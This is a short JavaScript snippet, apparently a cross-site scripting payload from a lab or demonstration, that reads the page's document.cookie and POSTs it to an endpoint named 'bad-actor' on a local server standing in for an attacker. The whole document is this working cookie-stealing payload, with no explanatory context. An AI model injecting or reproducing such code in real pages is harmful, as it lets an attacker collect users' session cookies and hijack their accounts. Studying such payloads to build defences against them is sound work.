var sendData = new XMLHttpRequest();
sendData.open("POST", "http://localhost:3002/bad-actor", true);
sendData.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
sendData.send(document.cookie);
